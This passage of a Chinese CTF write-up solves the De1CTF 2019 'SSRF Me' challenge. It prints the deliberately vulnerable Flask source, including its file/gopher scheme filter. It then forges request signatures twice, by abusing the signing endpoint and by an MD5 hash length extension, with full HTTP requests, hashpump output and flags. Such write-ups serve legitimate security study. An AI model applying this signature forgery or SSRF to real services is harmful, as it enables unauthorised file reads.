   self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    print(resp)</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):  <span class=\"comment\">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))  <span class=\"comment\"># urllib.unquote 相当与  urldecode</span></span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class=\"comment\">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>\n<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>\n<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>\n<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>\n<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>\n<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>\n<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie: action&#x3D;readscan; sign&#x3D;0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n&quot;}</code></p>\n<h3 id=\"0x02-另一种解法\"><a href=\"#0x02-另一种解法\" class=\"headerlink\" title=\"0x02 另一种解法\"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>\n<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>\n<p>求<code>（secret+flag.txt+scanread）</code></p>\n<p>经过测试密钥是16位 加上scanread是24位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:&#x2F;tmp&#x2F;HashPump# hashpump </span><br><span class=\"line\">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class=\"line\">Input Data: scan   #写上原有数据</span><br><span class=\"line\">Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度</span><br><span class=\"line\">Input Data to Add: read   #拓展的数据</span><br><span class=\"line\">46a6ff04f7bede58de30e93410935976 #生成的MD5</span><br><span class=\"line\">scan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read</span><br></pre></td></tr></table></figure>\n\n<p><code>burp suite</code>提交的数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie:action&#x3D;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read;sign&#x3D;46a6ff04f7bede58de30e93410935976</span><br></pre></td></tr></table></figure>\n\n<p>结果<code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{6cd67cbd-fdfb-45cc-8654-52766ef0635a}\\n&quot;}</code></p>\n","site":{"data":{}},"excerpt":"<h2 id=\"De1CTF-2019-SSRF-Me\"><a href=\"#De1CTF-2019-SSRF-Me\" class=\"headerlink\" title=\"[De1CTF 2019]SSRF Me\"></a>[De1CTF 2019]SSRF Me</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>大致了解flask框架，<a href=\"http://www.security-database.com/detail.php?alert=CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">CVE-2019-9948</a>：<code>urlopen（）可包含本地文件</code>，<a href=\"https://www.freebuf.com/articles/web/31756.html\" target=\"_blank\" rel=\"noopener\">哈希长度扩展攻击</a> 。</p>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示 <code>flag在./flag.txt中</code>。</p>\n<p>打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#! /usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\">#encoding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> request</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"></span><br><span class=\"line\">reload(sys)</span><br><span class=\"line\">sys.setdefaultencoding(<span class=\"string\">'latin1'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">secert_key = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Task</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self, action, param, sign, ip)</span>:</span></span><br><span class=\"line\">        self.action = action</span><br><span class=\"line\">        self.param = param</span><br><span class=\"line\">        self.sign = sign</span><br><span class=\"line\">        self.sandbox = md5(ip)</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"keyword\">not</span> os.path.exists(self.sandbox)):          <span class=\"comment\">#SandBox For Remote_Addr</span></span><br><span class=\"line\">            os.mkdir(self.sandbox)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Exec</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        result = &#123;&#125;</span><br><span class=\"line\">        result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (self.checkSign()):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"scan\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                tmpfile = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'w'</span>)</span><br><span class=\"line\">                resp = scan(self.param)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (resp == <span class=\"string\">\"Connection Timeout\"</span>):</span><br><span class=\"line\">                    result[<span class=\"string\">'data'</span>] = resp</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    print(resp)</span><br><span class=\"line\">                    tmpfile.write(resp)</span><br><span class=\"line\">                    tmpfile.close()</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">\"read\"</span> <span class=\"keyword\">in</span> self.action:</span><br><span class=\"line\">                f = open(<span class=\"string\">\"./%s/result.txt\"</span> % self.sandbox, <span class=\"string\">'r'</span>)</span><br><span class=\"line\">                result[<span class=\"string\">'code'</span>] = <span class=\"number\">200</span></span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = f.read()</span><br><span class=\"line\">            <span class=\"keyword\">if</span> result[<span class=\"string\">'code'</span>] == <span class=\"number\">500</span>:</span><br><span class=\"line\">                result[<span class=\"string\">'data'</span>] = <span class=\"string\">\"Action Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            result[<span class=\"string\">'code'</span>] = <span class=\"number\">500</span></span><br><span class=\"line\">            result[<span class=\"string\">'msg'</span>] = <span class=\"string\">\"Sign Error\"</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">checkSign</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (getSign(self.action, self.param) == self.sign):  <span class=\"comment\">#对secert_key、param、action进行MD5运算  的结果与self.sign作比较</span></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#generate Sign For Action Scan.</span></span><br><span class=\"line\"><span class=\"meta\">@app.route(\"/geneSign\", methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">geneSign</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))  <span class=\"comment\"># urllib.unquote 相当与  urldecode</span></span><br><span class=\"line\">    action = <span class=\"string\">\"scan\"</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> getSign(action, param)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">challenge</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    action = urllib.unquote(request.cookies.get(<span class=\"string\">\"action\"</span>))</span><br><span class=\"line\">    param = urllib.unquote(request.args.get(<span class=\"string\">\"param\"</span>, <span class=\"string\">\"\"</span>))</span><br><span class=\"line\">    sign = urllib.unquote(request.cookies.get(<span class=\"string\">\"sign\"</span>))</span><br><span class=\"line\">    ip = request.remote_addr</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(waf(param)):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"No Hacker!!!!\"</span></span><br><span class=\"line\">    task = Task(action, param, sign, ip)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> json.dumps(task.Exec())</span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> open(<span class=\"string\">\"code.txt\"</span>,<span class=\"string\">\"r\"</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    socket.setdefaulttimeout(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.urlopen(param).read()[:<span class=\"number\">50</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"Connection Timeout\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getSign</span><span class=\"params\">(action, param)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(secert_key + param + action).hexdigest() <span class=\"comment\">#对secert_key、param、action进行MD5摘要签名</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">md5</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> hashlib.md5(content).hexdigest()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">waf</span><span class=\"params\">(param)</span>:</span></span><br><span class=\"line\">    check=param.strip().lower()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> check.startswith(<span class=\"string\">\"gopher\"</span>) <span class=\"keyword\">or</span> check.startswith(<span class=\"string\">\"file\"</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    app.debug = <span class=\"literal\">False</span></span><br><span class=\"line\">    app.run(host=<span class=\"string\">'0.0.0.0'</span>,port=<span class=\"number\">80</span>)</span><br></pre></td></tr></table></figure>\n\n<p>分析代码，总共三条路由，<code>@app.route(&#39;/&#39;)</code>显示代码，<code>@app.route(&quot;/geneSign&quot;, methods=[&#39;GET&#39;, &#39;POST&#39;])</code>生成签名，<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>获取参数并执行<code>Exec()</code>函数</p>\n<p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，<code>param=flag.txt</code>，<code>action</code> 中要含有 <code>read</code> 和 <code>scan</code>，且 <code>sign=md5(secert_key + param + action)</code></p>\n<p>在<code>getSign</code>函数中，生成MD5签名的方式是<code>secert_key + param + action</code>其中<code>action=scan</code>，<code>secert_key</code>未知<code>param</code>可以控制。</p>\n<p>在<code>@app.route(&#39;/De1ta&#39;,methods=[&#39;GET&#39;,&#39;POST&#39;])</code>中，<code>cookies</code>中的<code>action</code>必须为<code>readscan</code>，sign为</p>\n<p><code>secert_key + param + scan</code>签名后的md5，使<code>param=flag.txtread</code>直接获取到签名后的md5。</p>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><p>先获取到签名后的md5</p>\n<p>访问<code>http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread</code></p>\n<p>返回为<code>0155303824bd0738b4ed0a52b7446c08</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET &#x2F;De1ta?param&#x3D;flag.txt HTTP&#x2F;1.1</span><br><span class=\"line\">Host: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn</span><br><span class=\"line\">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class=\"line\">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Cookie: action&#x3D;readscan; sign&#x3D;0155303824bd0738b4ed0a52b7446c08</span><br></pre></td></tr></table></figure>\n\n<p>结果</p>\n<p><code>{&quot;code&quot;: 200, &quot;data&quot;: &quot;flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n&quot;}</code></p>\n<h3 id=\"0x02-另一种解法\"><a href=\"#0x02-另一种解法\" class=\"headerlink\" title=\"0x02 另一种解法\"></a>0x02 另一种解法</h3><p>使用hashdump 利用哈希长度扩展攻击，</p>\n<p>已知<code>（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9</code></p>\n<p>求<code>（secret+flag.txt+scanread）</code></p>\n<p>经过测试密钥是16位 加上scanread是24位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@kali:&#x2F;tmp&#x2F;HashPump# hashpump </span><br><span class=\"line\">Input Signature: 40ad0bf20e771e768e9305810410c1b9</span><br><span class=\"line\">Input Data: scan   #写上原有数据</span><br><span class=\"line\">Input Key Length: 24    #密钥长度+数据长度+拓展的数据长度</span><br><span class=\"line\">Input Data to Add: read   #拓展的数据</span><br><span 